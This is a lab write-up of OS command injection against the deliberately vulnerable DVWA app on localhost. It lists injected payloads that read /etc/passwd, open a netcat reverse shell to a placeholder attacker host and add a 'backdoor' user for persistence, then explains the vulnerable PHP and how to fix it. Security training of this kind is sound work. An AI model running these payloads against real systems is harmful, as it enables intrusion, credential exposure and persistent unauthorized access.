# DVWA Lab — OS Command Injection

## Objective
Exploit OS Command Injection to execute arbitrary system commands
on the server and demonstrate Remote Code Execution (RCE).

## Environment
- Target: DVWA running on localhost
- URL: http://localhost/DVWA
- Login: admin / password
- Security Level: Low

## Steps

### 1. Access Command Injection Module
- Login to DVWA
- Navigate to: Vulnerabilities → Command Injection

### 2. Test Vulnerability
Input: `127.0.0.1 ; whoami`
Result: Output shows current user (www-data) — RCE confirmed ✅

### 3. List Directory Contents
Input: `127.0.0.1 ; ls -la`
Result: Files and directories listed

### 4. Read Sensitive Files
Input: `127.0.0.1 ; cat /etc/passwd`
Result: System user accounts displayed

### 5. Check Network Connections
Input: `127.0.0.1 ; netstat -tulnp`
Result: Open ports and listening services shown

### 6. Execute Reverse Shell
Input: `127.0.0.1 ; nc -e /bin/bash attacker-ip 4444`
Result: Reverse shell connection established (on attacker listener)

### 7. Create Backdoor User
Input: `127.0.0.1 ; useradd -m -s /bin/bash backdoor`
Result: New user created for persistence

## Vulnerability Explanation
User input directly concatenated into system command:

Vulnerable code:
```php
$cmd = "ping -c 4 " . $_POST['ip'];
system($cmd);
```

With input: `127.0.0.1 ; whoami`
Becomes: `ping -c 4 127.0.0.1 ; whoami`

The semicolon (`;`) terminates first command and executes second.

## Command Separators (Work in Linux/Unix)
- `;` → Execute next command
- `|` → Pipe output to next command
- `||` → Execute if previous fails
- `&&` → Execute if previous succeeds
- `&` → Run in background

## Impact
- Remote Code Execution (RCE)
- Server compromise
- Data exfiltration
- Malware installation
- Lateral movement to other systems
- Denial of Service (DoS)

## Remediation
- Input validation and whitelist allowed IPs
- Use built-in functions instead of system calls
- Principle of least privilege for web server user
- Disable dangerous functions
- Web Application Firewall (WAF)

## Tools Used
- DVWA
- Linux commands (whoami, ls, cat, netstat, nc)

## Status
✅ Successfully executed arbitrary OS commands - Full RCE achieved
